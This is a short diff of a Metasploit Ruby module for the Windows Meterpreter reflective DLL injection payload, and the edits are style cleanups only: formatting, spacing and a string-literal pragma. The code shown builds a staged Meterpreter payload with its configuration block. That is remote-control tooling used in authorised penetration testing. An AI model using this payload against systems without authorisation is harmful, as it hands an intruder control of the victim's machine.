@@ -1,8 +1,8 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
 
 require 'msf/core'
 require 'msf/core/payload/windows/meterpreter_loader'
@@ -18,25 +18,24 @@ require 'rex/payloads/meterpreter/config'
 ###
 
 module MetasploitModule
-
   include Msf::Payload::Windows::MeterpreterLoader
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Windows Meterpreter (Reflective Injection)',
-      'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged)',
-      'Author'        => ['skape','sf'],
-      'PayloadCompat' => { 'Convention' => 'sockedi', },
-      'License'       => MSF_LICENSE,
-      'Session'       => Msf::Sessions::Meterpreter_x86_Win))
+                      'Name'          => 'Windows Meterpreter (Reflective Injection)',
+                      'Description'   => 'Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged)',
+                      'Author'        => ['skape', 'sf'],
+                      'PayloadCompat' => { 'Convention' => 'sockedi' },
+                      'License'       => MSF_LICENSE,
+                      'Session'       => Msf::Sessions::Meterpreter_x86_Win))
   end
 
-  def stage_payload(opts={})
+  def stage_payload(opts = {})
     stage_meterpreter + generate_config(opts)
   end
 
-  def generate_config(opts={})
+  def generate_config(opts = {})
     opts[:uuid] ||= generate_payload_uuid
 
     # create the configuration block, which for staged connections is really simple.
@@ -55,5 +54,4 @@ module MetasploitModule
     # return the binary version of it
     config.to_b
   end
-
 end
